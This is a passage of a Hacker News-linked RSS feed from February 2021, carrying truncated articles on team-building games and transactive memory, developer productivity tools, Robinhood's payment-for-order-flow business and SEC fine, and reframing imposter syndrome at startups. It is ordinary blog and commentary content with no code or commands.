<p>This kind of information sharing is called <strong>Transactive Memory</strong> and it is a key component to forming close relationships and creating a team that functions well together. <mark>Each person in a highly collaborative team will help <em>maintain the shared group memory and understanding</em> such that the group is maximizing each member's strengths, compensating for weaknesses, and the entire team can work together optimally toward a shared goal</mark>.</p>
<p>Games help to create these shared memories by putting group members into a new experience and then asking everybody to participate, recall information, and work together. These actions all combine into an event that team members can remember together and use to learn and understand each other more deeply.</p>
<blockquote>
<p>The existence of effective transactive memory systems in teams has been found to enhance task performance. Methods of developing transactive memory are therefore an important focus of research. This study aimed to explore one such method, the use of a generic team-skills training program, to develop transactive memory and subsequent task performance [...] <strong>Results confirmed that</strong> <strong>those teams that had been trained to develop a range of team skills such as problem-solving, interpersonal relationships, goal setting, and role allocation evidenced significantly higher team skill, transactive memory, and performance than those that were not trained in …</strong></p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://slideswith.com/blog/games-for-remote-team-building">https://slideswith.com/blog/games-for-remote-team-building</a></em></p>]]>
            </description>
            <link>https://slideswith.com/blog/games-for-remote-team-building</link>
            <guid isPermaLink="false">hacker-news-small-sites-25989336</guid>
            <pubDate>Mon, 01 Feb 2021 15:16:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[These Are the 21 Best Developer Productivity Tools]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25989252">thread link</a>) | @KaiserSanchez
<br/>
February 1, 2021 | https://www.7pace.com/blog/developer-productivity-tools | <a href="https://web.archive.org/web/*/https://www.7pace.com/blog/developer-productivity-tools">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
							
<p>If work in the 21st century has a theme, it’s this: <a href="https://www.7pace.com/blog/how-to-measure-developer-productivity"><u>Productivity</u></a>.</p>



<p>We’re all striving to be more productive —&nbsp;at work, at home, and everywhere in between. And to help us achieve ultimate productivity, there are <em>countless</em>&nbsp;tools and resources that promise to make you able to work harder, better, faster, and stronger.</p>



<p>But not all productivity tools were created equal. Some are just better than others, and some are better suited to different tasks and workflows. That’s where this guide comes in.</p>



<p>If you’re a developer standing in front of the veritable sea of productivity apps and tools available and wondering where to start, don’t worry. We’ve got you. We’ve narrowed down the 21 best developer productivity tools, focusing on resources that will help you stave off distractions, find your flow, and work collaboratively across your team.</p>



<h2>The 21 Developer Productivity Tools You Need to Download Right Now</h2>



<p>Before we dive in, let’s cover the bad news: You’re <a href="https://www.7pace.com/blog/workplace-productivity"><u>never going to become 100 percent productive</u></a>. Sorry, but that’s just not how human brains work.</p>



<p>The first step is to approach this list with the right motives. If you’re looking to work better with your teammates or break bad work habits (like checking social media every few minutes), these tools can help. If your goal is to <a href="https://www.7pace.com/blog/deep-work-in-the-age-of-distraction"><u>deep work for 14 hours a day</u></a>, you need to accept that that’s just unrealistic.</p>



<p>Don’t think of productivity as an end goal or something you will eventually achieve. Think of it as a <a href="https://www.7pace.com/blog/healthier-work-systems"><u>journey you take every time you sit down to work</u></a>. And use these tools to help guide you on that daily journey.</p>



<h3>Developer Productivity Tools for Project Management, Teamwork, and Workflow</h3>



<figure><img loading="lazy" width="970" height="585" src="https://www.7pace.com/wp-content/uploads/2021/01/01-Image-4.jpg" alt="Developer Productivity Tools for Project Management, Teamwork, and Workflow" srcset="https://www.7pace.com/wp-content/uploads/2021/01/01-Image-4.jpg 970w, https://www.7pace.com/wp-content/uploads/2021/01/01-Image-4-300x181.jpg 300w, https://www.7pace.com/wp-content/uploads/2021/01/01-Image-4-768x463.jpg 768w" sizes="(max-width: 970px) 100vw, 970px"></figure>



<p><a href="https://hey.space/" target="_blank" rel="noreferrer noopener"><strong><u>HeySpace</u></strong></a>&nbsp;is a task management software that also has a chat feature —&nbsp;sort of like a combination of Slack and Trello. Its innovative and user-friendly design allows you to see tasks and communications in just one screen. That means no more toggling between different screens (or different apps) to chat with your team about a project or task. HeySpace offers both free and paid premium plans, depending on the number of users on your team.</p>



<p><a href="https://www.codestream.com/" target="_blank" rel="noreferrer noopener"><strong><u>Codestream</u></strong></a>&nbsp;is for developers who are tired of the effort and frustration that come with code reviews. This tool lets you skip the pull request by simply highlighting a code block and adding a note. This means discussing code with your team simply and directly in the coding environment. Codestream offers support for every programming language and makes group problem solving a simple part of any team’s workflow.</p>



<p><a href="https://www.mantisbt.org/" target="_blank" rel="noreferrer noopener"><strong><u>MantisBT</u></strong></a>&nbsp;is the bug tracker of your dreams. Just like its namesake, the Mantis, this tool leaves no stone unturned in its search for bugs in your code. A web-based bug tracking program, MantisBT tracks your code for errors, and then sends an email notification to you and everyone on your team whenever it finds a problem. Don’t worry —&nbsp;you can customize notifications if an email for every bug isn’t your thing.</p>



<p><a href="https://codeanywhere.com/" target="_blank" rel="noreferrer noopener"><strong><u>Codeanywhere</u></strong></a>&nbsp;is a game-changing tool for teams of developers who need to work together on one code block at the same time. Think of it like Google Docs for code. It’s a code editor that supports more than 70 different programming languages, and allows all users to see who’s working on what in real time. All you have to do to get started is send a link to your code editor to anyone who’s on your team.</p>



<p><a href="https://anydesk.com/en" target="_blank" rel="noreferrer noopener"><strong><u>AnyDesk</u></strong></a><strong>&nbsp;</strong>is for anyone who has a killer desktop setup at work, and a similarly killer desktop setup at home, and wants to be able to work on both of them. Setting up the perfect virtual environment is a pain —&nbsp;and can take literal hours. So instead of doing it for every computer you use to code, just do it once and then use AnyDesk to connect to your work PC from any computer anywhere.</p>



<p><a href="https://tuple.app/" target="_blank" rel="noreferrer noopener"><strong><u>Tuple</u></strong></a><strong>&nbsp;</strong>is for developers who have realized that, as much as they’ve become standard for workers in 2020, Slack and Zoom weren’t made for programmers —&nbsp;and it shows. A trio of software engineers created Tuple to make pair programming easier for remote teams, and the result is an app with simple, high-quality screen sharing, crisp audio, and efficient CPU usage so it has full functionality even on a low-latency connection.</p>



<figure><img loading="lazy" width="970" height="585" src="https://www.7pace.com/wp-content/uploads/2021/01/03-Image-3.jpg" alt="todoist" srcset="https://www.7pace.com/wp-content/uploads/2021/01/03-Image-3.jpg 970w, https://www.7pace.com/wp-content/uploads/2021/01/03-Image-3-300x181.jpg 300w, https://www.7pace.com/wp-content/uploads/2021/01/03-Image-3-768x463.jpg 768w" sizes="(max-width: 970px) 100vw, 970px"></figure>



<p><a href="https://todoist.com/home" target="_blank" rel="noreferrer noopener"><strong><u>Todolist </u></strong></a>is the only to-do list app that’s made just for developers. With just how many list apps exist, you’re probably wondering what makes this one good enough to make our list, so here it is: Todolist allows you to do all the same productivity tasks you’d do with any list app —&nbsp;prioritize tasks, filter and group them, and archive them —&nbsp;but from a code-like environment. You manage everything with simple commands that make it easy to check things off your list and queue up a new project, without breaking your flow.</p>



<p><a href="https://www.figma.com/" target="_blank" rel="noreferrer noopener"><strong><u>Figma</u></strong></a><strong>&nbsp;</strong>is a must-have tool for developers who work with designers, product managers, or product teams. It’s a browser-based tool that gives designers one, single link where they can access crucial information and assets like colors, widths, and heights for design elements.</p>



<h3>Developer Productivity Tools for Breaking Bad Habits (and Forming Good Ones)</h3>



<figure><img loading="lazy" width="970" height="585" src="https://www.7pace.com/wp-content/uploads/2021/01/02-Image-3.jpg" alt="Developer Productivity Tools for Breaking Bad Habits (and Forming Good Ones)" srcset="https://www.7pace.com/wp-content/uploads/2021/01/02-Image-3.jpg 970w, https://www.7pace.com/wp-content/uploads/2021/01/02-Image-3-300x181.jpg 300w, https://www.7pace.com/wp-content/uploads/2021/01/02-Image-3-768x463.jpg 768w" sizes="(max-width: 970px) 100vw, 970px"></figure>



<p><a href="https://habitica.com/" target="_blank" rel="noreferrer noopener"><strong><u>Habitica</u></strong></a><strong>&nbsp;</strong>makes it fun to create good habits at work. Using pixel-like design, Habitica turns you into a hero in an in-platform world where you’re tasked with fighting through daily, weekly, and long-term goals. For completing tasks and building up good habits, you earn points, discover new animals, and build your strength. For failing at tasks, you lose strength — and your character can die. For developers who love gaming, this is an entertaining (and effective) way to build better work habits.</p>



<p><a href="https://justgetflux.com/" target="_blank" rel="noreferrer noopener"><strong><u>F.lux</u></strong></a>&nbsp;is the productivity tool that will save you from dry, tired eyes —&nbsp;a problem for developers everywhere. This tool automatically adjusts your screen color based on your time and location, making colors warmer as it gets dark where you are to make your screen more natural for your eyes in the dark. You can also override the automatic color-changes and set your own schedule, which is a great way to remind yourself to take breaks from the harsh light of your computer screen.</p>



<h3>Developer Productivity Tools for Banishing Distractions</h3>



<p><a href="https://www.sublimetext.com/" target="_blank" rel="noreferrer noopener"><strong><u>Sublime Text</u></strong></a>&nbsp;is designed to be a code editor with an easy-to-use interface and eye-friendly work environment. It allows you to markup and program in a variety of coding languages, while also easily moving across files, switching between projects, and changing specific lines of code. But one of the features we love most about Sublime Text is its built-in distraction mode, which is sort of like a do-not-disturb setting for when you want to deep work.</p>



<p><a href="https://pi-hole.net/" target="_blank" rel="noreferrer noopener"><strong><u>Pi-Hole</u></strong></a><strong>&nbsp;</strong>is for those developers who think there’s nothing more distracting than a webpage ad. Think about it: They clutter up your screen. They reduce network performance. By all accounts, they’re an unnecessary obstacle in the way of productive work. Enter Pi-Hole, an ad-blocker that connects to your router instead of your browser, making it able to provide network-wide ad blocking. Pairing Pi-Hole with a VPN protects every device on your network from ads that distract away from work.</p>



<p><a href="https://getcoldturkey.com/" target="_blank" rel="noreferrer noopener"><strong><u>Cold Turkey</u></strong></a><strong>&nbsp;</strong>requires you to know exactly what your vices are. But then it does a really great job at blocking you from accessing them. Set it up to limit access to certain websites, certain apps, and even your internet access. The result? A work environment that’s free of all distractions for as long as you need it to be, allowing you to work without the usual interruptions.</p>



<h3>Developer Productivity Tools for Getting Into Your Flow</h3>



<p><a href="https://chrome.google.com/webstore/detail/strict-workflow/cgmnfnmlficgeijcalkgnnkigkefkbhd?hl=en" target="_blank" rel="noreferrer noopener"><strong><u>Strict Workflow</u></strong></a><strong>&nbsp;</strong>embraces the research-backed success of the Pomodoro method —&nbsp;the idea that for maximum productivity, you should alternate 25-minute focused sprints with 5-minute breaks. Using the Pomodoro method used to require a timer, but not anymore. Strict Workflow is a Chrome extension that acts as a built-in timer for that uber-effective work-and-break cycle. It runs in the background and lets you know when it’s time to work, and when it’s time to take a breather. No egg timer required.</p>



<figure><img loading="lazy" width="970" height="585" src="https://www.7pace.com/wp-content/uploads/2021/01/04-Image-1.jpg" alt="Developer Productivity Tools for Getting Into Your Flow" srcset="https://www.7pace.com/wp-content/uploads/2021/01/04-Image-1.jpg 970w, https://www.7pace.com/wp-content/uploads/2021/01/04-Image-1-300x181.jpg 300w, https://www.7pace.com/wp-content/uploads/2021/01/04-Image-1-768x463.jpg 768w" sizes="(max-width: 970px) 100vw, 970px"></figure>



<p><a href="https://memory.ai/dewo" target="_blank" rel="noreferrer noopener"><strong><u>Dewo</u></strong></a><strong>&nbsp;</strong>is the tool developers need to combat one of their biggest disruptors: Context switching. Dewo bills itself as users’ “personal assistant for deep work,” and that’s pretty much what it does. The app uses AI to analyze your productivity patterns, and then provides you with insights that should help you figure out how to work not harder, but smarter. Dewo can also toggle a do-not-disturb mode that silences other apps and sets your Slack status to “Away” once you enter a flow state, ensuring that nothing gets in the way of that sweet, sweet deep work.</p>



<p><a href="https://github.com/ggreer/the_silver_searcher" target="_blank" rel="noreferrer noopener"><strong><u>The Silver Searcher</u></strong></a><strong>&nbsp;</strong>is another app for developers that’s meant to minimize wasted time at work —&nbsp;by making it easier to search your code. Think about it: If you’re like a lot of devs, you probably spend a fair amount of your “coding time” actually reading and scanning code, not writing it. The Silver Searcher helps combat that by making it much easier —&nbsp;and much, <em>much</em>&nbsp;faster —&nbsp;to search through code.</p>



<p><a href="https://walrus.ai/" target="_blank" rel="noreferrer noopener"><strong><u>Walrus.ai</u></strong></a><strong>&nbsp;</strong>is yet another app that’s here to save money and effort for teams of developers, this time by automating QA testing. It makes testing more efficient and lightweight by providing full end-to-end testing via a single API call, as opposed to cumbersome in-house automated testing or manual QA. And if you’re concerned about accuracy, Walrus employs a whole team to monitor every run and keep a look out for false positives and negatives.</p>



<p><a href="https://www.programmersmusic.com/" target="_blank" rel="noreferrer noopener"><strong><u>Programmer’s Music</u></strong></a>&nbsp;is the perfect app for the developer that wants the perfect soundtrack for productive work, but doesn’t want to put in the time or effort to curate a playlist his or herself. There are plenty of sites out there that offer curated music lists to <a href="https://www.7pace.com/blog/heres-what-science-says-about-how-music-affects-your-productivity"><u>promote focus and productivity</u></a>, but this one is our favorite because of its non-vocal, distraction free songs that can be timed to the Pomodoro method if you want them to be.</p>



<h3>Developer Productivity Tools for Tracking Time (Hint: You Only Need One)</h3>



<figure><img loading="lazy" width="970" height="585" src="https://www.7pace.com/wp-content/uploads/2021/01/05-Image-1.jpg" alt="Developer Productivity Tools for Tracking Time (Hint: You Only Need One)" srcset="https://www.7pace.com/wp-content/uploads/2021/01/05-Image-1.jpg 970w, https://www.7pace.com/wp-content/uploads/2021/01/05-Image-1-300x181.jpg 300w, https://www.7pace.com/wp-content/uploads/2021/01/05-Image-1-768x463.jpg 768w" sizes="(max-width: 970px) 100vw, 970px"></figure>



<p><a href="https://www.7pace.com/timetracker"><strong><u>7pace Timetracker</u></strong></a>&nbsp;…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.7pace.com/blog/developer-productivity-tools">https://www.7pace.com/blog/developer-productivity-tools</a></em></p>]]>
            </description>
            <link>https://www.7pace.com/blog/developer-productivity-tools</link>
            <guid isPermaLink="false">hacker-news-small-sites-25989252</guid>
            <pubDate>Mon, 01 Feb 2021 15:06:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Robinhood Misled the Poor and Rewarded the Rich]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 89 (<a href="https://news.ycombinator.com/item?id=25989199">thread link</a>) | @iamspoilt
<br/>
February 1, 2021 | https://themeasureofaplan.com/robinhood/ | <a href="https://web.archive.org/web/*/https://themeasureofaplan.com/robinhood/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
		<!-- site-header -->
		<!-- /site-header --><article>
	
	<!-- post-title -->
	 <!-- /post-title -->

	<p>January 31st, 2021 | Posted in

		<a href="https://themeasureofaplan.com/category/uncategorized/">Uncategorized</a>
		</p>

	<img width="700" height="394" src="https://themeasureofaplan.com/wp-content/uploads/2021/01/Robinhood-header-image.jpg" alt="" loading="lazy" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%20394'%3E%3C/svg%3E" data-lazy-src="https://themeasureofaplan.com/wp-content/uploads/2021/01/Robinhood-header-image.jpg">	
	
    <!-- if URL contains "?v=clean" do not show the mailchimp email sign-up box-->
	        
        	
	
<p>[Feb-1 update: a new section “Clearing Houses &amp; the Plumbing Behind Financial Markets” has been added]</p>
<p>[Feb-2: updated with Robinhood’s Q4 2020 revenues from “payment for order flow”]</p>
<p>&nbsp;<br>
This is a story about Robinhood, an online broker that promised to “democratize finance for all”, but ended up deceiving its customers and helping the rich get richer.</p>
<p>So buckle up — we’re heading off to the moon 🚀🌙! But first, let’s pause for a glance at:</p>
<ul>
<li>A run-down of Robinhood’s business model, and how they were fined $65 million for failing to disclose that most of their revenues come from Wall Street partners</li>
<li>The opaque world of “payment for order flow”, and how this creates massive conflicts of interest for Robinhood</li>
<li>The ongoing GameStop ($GME) saga — where Robinhood conveniently ends up siding with the hedge funds, to the detriment of everyday investors around the globe</li>
</ul>

<h2>The Origins of Robinhood</h2>
<p>Robinhood’s co-founders Vlad Tenev and Baiju Bhatt were roommates at Stanford, and set off after graduation to work in New York, building trading software for hedge funds <em>(note to reader: this is one of many ties to the hedge fund world that we’ll come across)</em>.</p>
<p>In 2013, Vlad and Baiju decided to strike off on their own and launched Robinhood — an online platform that allowed investors to trade stocks, ETFs, and other financial assets without paying trading commissions.</p>
<p>At the time, competing brokers were charging $5 to $10 per trade, so Robinhood’s free model helped them to win the trust of millions of customers across America.</p>
<p>Fueled by crisp marketing, simple user interfaces, and their no-fee model, Robinhood grew by leaps and bounds over the next few years. The company now boasts more than 13 million customers, 1,200 employees, and a valuation of $11 billion after raising funds in August 2020.</p>
<p>The chart below from <a href="https://www.ft.com/content/b208cbbe-579c-4cbf-9358-01ae02b4381b" rel="noopener" target="_blank">FT and Pitchbook</a> captures Robinhood’s meteoric rise:</p>
<p><img src="https://themeasureofaplan.com/wp-content/uploads/2021/01/Robinhood-post-money-valuation-timeline-FT.png" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://themeasureofaplan.com/wp-content/uploads/2021/01/Robinhood-post-money-valuation-timeline-FT.png"></p>

<h2>Robbing the Hood and Giving to the Rich?</h2>
<p>All was green and all was good for Robinhood and the merry men.</p>
<p>Their founders made proud claims that “we believe the financial system should be built to work for everyone”, and <a href="https://www.ft.com/content/c3ed6758-e51c-48b1-b6a6-a17ccb265b28" rel="noopener" target="_blank">“we didn’t build Robinhood to make the rich people richer”</a>.</p>
<p>However, these claims don’t hold up to close scrutiny.</p>
<p>In December 2020, the SEC (America’s financial markets regulator) <a href="https://www.sec.gov/news/press-release/2020-321" rel="noopener" target="_blank">fined Robinhood $65 million</a> for “misleading customers about revenue sources and failing to satisfy duty of best execution”.</p>
<p>This investigation shined a light on how Robinhood was operating beneath the glitzy marketing and lip service towards democratizing finance.</p>
<p>Excerpts from the <a href="https://www.sec.gov/news/press-release/2020-321" rel="noopener" target="_blank">SEC press release</a> (my emphasis added):</p>
<p>According to the SEC’s order, between 2015 and late 2018, <b>Robinhood made misleading statements and omissions in customer communications, including in FAQ pages on its website</b>, about its largest revenue source when describing how it made money – namely, payments from trading firms in exchange for Robinhood sending its customer orders to those firms for execution, also known as “payment for order flow.”</p>
<p>As the SEC’s order finds, one of Robinhood’s selling points to customers was that trading was “commission free,” but due in large part to its unusually high payment for order flow rates, <b>Robinhood customers’ orders were executed at prices that were inferior to other brokers’ prices</b>.  Despite this, according to the SEC’s order, Robinhood falsely claimed in a website FAQ between October 2018 and June 2019 that its execution quality matched or beat that of its competitors.</p>
<p>The order finds that <b>Robinhood provided inferior trade prices that in aggregate deprived customers of $34.1 million even after taking into account the savings from not paying a commission</b>.  Robinhood made these false and misleading statements during the time in which it was growing rapidly.</p>
<p>“Robinhood failed to seek to obtain the best reasonably available terms when executing customers’ orders, causing customers to lose tens of millions of dollars,” said Joseph Sansone, Chief of the SEC Enforcement Division’s Market Abuse Unit.  “Today’s action sends a clear message that the Commission will not allow brokers to ignore their obligations to customers.”</p>
<p>&nbsp;<br>
In other words:</p>
<ul>
<li>Robinhood was selling its customers’ trade data to market makers and high-frequency traders — Wall Street firms that profit off of these trades</li>
<li>This is Robinhood’s largest source of revenue — a fact that they curiously left out on their FAQ page describing how they made money</li>
<li>This practice meant that trades placed on Robinhood weren’t executed at the best price, costing customer tens of millions of dollars, <b>even after taking into account the savings from not paying a commission</b></li>
</ul>
<p>One more time: Robinhood lied about their business model, made money by selling customer data to Wall Street, at the ultimate expense of its own customers.</p>
<p>If you’re looking for other reasons to get riled up, how about this other time Robinhood was fined for <a href="https://www.finra.org/media-center/newsreleases/2019/finra-fines-robinhood-financial-llc-125-million-best-execution" rel="noopener" target="_blank">failing to protect their customers’ best interest</a>, or when Robinhood improperly stored their customers’ passwords, leading to <a href="https://www.bloomberg.com/news/articles/2020-10-15/robinhood-estimates-hackers-infiltrated-almost-2-000-accounts" rel="noopener" target="_blank">2,000 accounts being compromised and having funds siphoned off</a>.</p>
<p>Next — let’s dive into how the murky world of “payment for order flow” works, how Robinhood makes money from it, and why this makes Robinhood beholden to their Wall Street partners.</p>

<h2>Sally Schmo and “Payment for Order Flow”</h2>
<p>As we saw above, Robinhood’s main revenue source comes from selling customer trade data to other firms. This is a controversial practice known as “Payment for Order Flow” (PFOF in financial regulatory lingo).</p>
<p>To give you a sense of it, PFOF was <a href="https://web.archive.org/web/20200817124549/https://money.cnn.com/2000/05/29/investing/q_madoff/" rel="noopener" target="_blank">pioneered by Bernie Madoff</a> (one of history’s greatest con men), and the practice is <a href="https://www.gbm.scotiabank.com/content/dam/gbm/market-insights/etf/october/2019-10-02-Free-Trading.pdf" rel="noopener" target="_blank">banned in Canada</a>.</p>
<p>It’s a bit of a tangled web, so I’ve created the graphic below to lay it out in steps:</p>
<p><img src="https://themeasureofaplan.com/wp-content/uploads/2021/01/Robinhood-NOK-order-flow-v3.png" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://themeasureofaplan.com/wp-content/uploads/2021/01/Robinhood-NOK-order-flow-v3.png"></p>
<p>Let’s take the example of a Robinhood customer who wants to buy 100 shares of Nokia (NOK).</p>
<ol>
<li>Investor submits an order to buy 100 shares of $NOK at a max price of $4.00 per share ($400 total)</li>
<li>Broker asks the market maker (MM) to find 100 shares of $NOK</li>
<li>MM buys 100 shares of $NOK at the best price it can find — $398 in this example – and collects $2 of profit</li>
<li>Stock exchange delivers 100 shares of $NOK to the MM</li>
<li>MM delivers 100 shares and gives the broker a cut of the profit (aka, PFOF)</li>
<li>Broker delivers 100 shares of $NOK to the investor for a total of $400</li>
</ol>
<p>After all is said and done, the market maker and Robinhood walk away with $2 in profit, and the investor receives 100 shares of Nokia for $400.</p>
<p>The example above is simplified and uses dummy numbers, but the concept holds true.</p>
<p>Robinhood doesn’t carry out customer orders itself, it routes them to MMs (such as Citadel) for the MM to execute.</p>
<p>The MM buys the requested shares for a price, resells those shares to the Robinhood customer at a slightly higher price, pockets the difference, and shares some of the profits with Robinhood.</p>
<p>So what’s the big deal? Why does “payment for order flow” harm the everyday investor?</p>
<p>When you place an order on Robinhood, you don’t get transparency on what the best price was, whether your order was executed at that best price, and how much profit was captured by the MM / Robinhood in the process.</p>
<p>Even though Robinhood customers don’t pay commissions on their trades (the $5 to $10 per trade that brokers used to charge), there is an “invisible cost” to the customer since they are paying more for the shares that they trade.</p>
<p>Taking this from a different angle, why does the MM pay Robinhood for the order? If the MM wasn’t able to make a profit on the execution of these trades what would be in it for them?</p>
<p>Keep in mind that Robinhood was fined $65 million by the SEC because Robinhood customers weren’t getting the best price on their trades, and since Robinhood misled their customer about this practice.</p>

<h2>How Much Does Robinhood Earn from “Payment for Order Flow”?</h2>
<p>According to <a href="https://cdn.robinhood.com/assets/robinhood/legal/RHS%20SEC%20Rule%20606a%20and%20607%20Disclosure%20Report%20Q4%202020.pdf" rel="noopener" target="_blank">Robinhood’s regulatory filings for Q4 2020</a>, Robinhood made a whopping $221 million in revenue from PFOF in Q4 2020 alone.</p>
<p>I’ve tabulated the data in a spreadsheet (<a href="https://drive.google.com/drive/u/0/folders/1pM7iQqZejiZIzmzX8XW36hQft7xJ2Hyt" rel="noopener" target="_blank">available here</a>), and have broken out their revenue from each partner:</p>
<p><img src="https://themeasureofaplan.com/wp-content/uploads/2021/02/Robinhood-Q4-2020-payment-for-order-flow-revenues.png" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://themeasureofaplan.com/wp-content/uploads/2021/02/Robinhood-Q4-2020-payment-for-order-flow-revenues.png"></p>
<p>Nearly half of Robinhood’s PFOF revenues — $108 million in Q4 2020 alone — come from Citadel. 🚨🚨 Remember that name, as they’ll feature prominently in the epic struggle for GameStop stock that follows.</p>
<p>Citadel is a hedge fund and market maker. Its success has vaulted founder Ken Griffin to a <a href="https://en.wikipedia.org/wiki/Kenneth_C._Griffin" rel="noopener" target="_blank">net worth of more than $20 billion</a>. Technically, the two sides of Citadel (hedge fund / market maker) are split into two separate arms — but they are both under <a href="https://en.wikipedia.org/wiki/Citadel_LLC" rel="noopener" target="_blank">one parent company</a> and both arms are owned by Ken Griffin.</p>
<p>As a side note, Citadel Securities (the market marker arm) has been fined numerous times in the past, for activities such as <a href="https://www.sec.gov/news/pressrelease/2017-11.html" target="_blank" rel="noopener">“misleading customers about pricing trades”</a>, <a href="https://www.bloomberg.com/news/articles/2020-07-21/citadel-securities-fined-by-finra-for-trading-ahead-of-clients" rel="noopener" target="_blank">“trading ahead of clients”</a>, and <a href="https://www.ft.com/content/16cee174-3b7f-11ea-b232-000f4477fbca" rel="noopener" target="_blank">“trading rule violations”</a>.</p>
<p>To reiterate — Robinhood makes hundreds of millions of dollars per quarter from selling customer data to Wall Street firms such as Citadel. These firms profit off of this ‘order flow’. And Robinhood has a documented history of misleading customers about these relationships.</p>
<p>So who is Robinhood beholden to: its customer — the general public who trades on the platform — or the Wall Street firms who profit off of these trades?</p>
<p>What was that in the back? Did someone say “conflict of interest”?</p>
<p>And yes, it’s true that most other brokers also make money from PFOF, but none rely on it nearly as much as Robinhood does.</p>
<p>From <a href="https://www.morningstar.ca/ca/news/208445/robinhood-was-indeed-too-good-to-be-true.aspx" rel="noopener" target="_blank">Forbes / Morningstar</a>:</p>
<p>In the first quarter of 2020, 70% of Robinhood’s revenues derived from payments for order flows, as opposed to 17% for E-Trade and just 3% for Schwab. Yes, Robinhood has observed standard practice–but with distinctly above-average enthusiasm.</p>
<p>Enough about PFOF. Let’s get to the action of the GameStop story to see how conflict of interest plays out in a live situation.</p>

<h2>$GME and Me</h2>
<p>You’ve likely all heard this story already but I’ll …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://themeasureofaplan.com/robinhood/">https://themeasureofaplan.com/robinhood/</a></em></p>]]>
            </description>
            <link>https://themeasureofaplan.com/robinhood/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25989199</guid>
            <pubDate>Mon, 01 Feb 2021 14:59:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reframing Imposter Syndrome]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25989195">thread link</a>) | @staccatomeasure
<br/>
February 1, 2021 | https://staysaasy.com/leadership/2021/01/31/reframing-imposter-syndrome.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/leadership/2021/01/31/reframing-imposter-syndrome.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>For about year when I worked at a 50-person startup, the most common thought that I had was “I have no idea what I’m doing.”</p>

<p>What should we build next? How should we set up a good process for performance reviews? How do we get more people to want to buy our product? Are we shipping too many bugs? Are we overly conservative and shipping too few? Almost every day involved at least one strategic decision that I didn’t feel that I had the qualifications to make.</p>

<p>These moments could be unsettling, and in retrospect I had a classic, low-grade case of imposter syndrome. I felt like I was playing in a band and improvising while everyone else knew the music. With the benefit of hindsight and substantially more experience, I wanted to write up a few thoughts on scaling companies to reframe this imposter syndrome in a more realistic light.</p>

<h2 id="everybody-is-improvising">Everybody is Improvising</h2>

<p>As that same company grew to over 500 people, I kept waiting for the magic moment where I (or others) suddenly knew how to handle the decisions that came our way. As a 50-person company we figured things out as we went along, or made the best call we could with imperfect processes, data, and first-principles thinking. After growing over 10x larger, the problems changed, the processes and data improved, but the approach didn’t.</p>

<p>In retrospect this should have been obvious. Every company and team is different, and there is no sheet music to play from.</p>

<p>Even startups that are widely considered to be successful still need to figure stuff out the old-fashioned way:</p>

<ul>
  <li>People at all levels of the organization, including the highest-level executives, often reason from first principles. There are techniques that one can learn to be more effective; there is no manual for how to respond to any arbitrary new situation.</li>
  <li>Most decisions are made with imperfect or incomplete information.</li>
  <li>Company leadership does not have all the answers, and very smart people make both brilliant decisions and damaging strategic errors.</li>
  <li>Experienced leaders are also capable of being irrational, reacting in an emotionally driven way, or surrendering to groupthink of various forms. People struggle, question decisions that they’ve made, and generally stress out.</li>
</ul>

<p>Simply put, if you’re feeling like a fraud for needing to figure things out from first principles, know that almost everyone else is doing the same at least from time-to-time (although experienced people do tend to have a more zen attitude and realize that it’s just a part of the process). All startups are messy, and things get done by smart people making the best decisions they can with the data and resources that they have. There is no secret cabal of “grownups” who know the secret to scaling companies.</p>

<h2 id="but-experts-are-actually-better-in-some-ways">But Experts Are Actually Better In Some Ways</h2>

<p>Of course, experience is extremely beneficial. I find that there are generally two major areas in which experience matters. Neither of them should make you feel like an imposter, and neither will give you definitive answers on how you should operate your company.</p>

<p>The first important dimension is that experts have a really wide portfolio of operating techniques. To extend the music analogy, these techniques are like chords or guitar licks that you can learn and later use to improvise. It might take a while to build a repertoire, but most startup techniques are straightforward and can be learned through reading, advice, or practice. These are technical skills, not God-given talents.</p>

<p>The other area where experience is critical, is giving you reps in challenging situations. Examples include:</p>

<ul>
  <li>How do you know if you’re wasting time on something unimportant? How do you know what to half-ass vs. whole-ass?</li>
  <li>How do you handle stress over long periods of time? How do you strike a balance between optimism and realism with your team? How do you stay calm in the face of pressure? How do you know when you or someone on your team is burning out?</li>
  <li>How do you handle difficult situations? What do you do the first time someone has a personal tragedy on your team, when you have to fire someone on your team?</li>
  <li>How do you know if a struggling team member’s performance is salvageable, or if they’re unlikely to be able to turn things around?</li>
</ul>

<p>For these skills, the fact of the matter is you just need to live through a lot of situations to build strength at identifying patterns and preparing your mind for future situations. In the musical performance of a startup, these skills are like practicing until your fingers are strong and you can easily play whatever comes your way.</p>

<h2 id="takeaways">Takeaways</h2>

<p>Decision-making from first principles is the default at most companies, even successful ones. There is no sheet music for running your team or business.</p>

<p>Experience can give you more operating techniques and build the muscle required to be a good manager or leader. We try to write about these transferable techniques and perspectives. But there is no playbook that will teach you how to make the right decisions.</p>


    

    




  </div></div>]]>
            </description>
            <link>https://staysaasy.com/leadership/2021/01/31/reframing-imposter-syndrome.html</link>
